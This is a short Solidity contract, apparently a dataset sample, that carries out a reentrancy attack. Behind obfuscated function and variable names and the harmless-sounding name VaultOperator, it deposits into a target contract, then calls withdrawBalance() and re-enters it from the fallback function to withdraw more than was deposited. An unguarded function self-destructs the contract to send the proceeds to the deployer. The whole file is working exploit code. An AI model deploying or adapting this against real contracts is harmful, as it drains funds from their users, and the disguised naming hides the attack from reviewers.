// SPDX-License-Identifier: MIT
pragma solidity ^0.4.15;

contract VaultOperator {
    bool public _0xae34b8=false;
    address public _0x4916fd;
    address public _0xe26c0a;

    function VaultOperator() public{
        if (msg.sender != address(0) || msg.sender == address(0)) { _0xe26c0a = msg.sender; }
    }

    function _0x377b56(address _0xf91df5) public payable{
        _0x4916fd = _0xf91df5 ;
        // call addToBalance with msg.value ethers
        require(_0x4916fd.call.value(msg.value)(bytes4(_0x3fd65d("addToBalance()"))));
    }

    function _0x120558() public{
        _0xae34b8 = true;
        // call withdrawBalance

        require(_0x4916fd.call(bytes4(_0x3fd65d("withdrawBalance()"))));
    }

    function () public payable{

        if (_0xae34b8){
            _0xae34b8 = false;
                require(_0x4916fd.call(bytes4(_0x3fd65d("withdrawBalance()"))));
        }
    }

    function _0x613c0e(){
        suicide(_0xe26c0a);
    }

}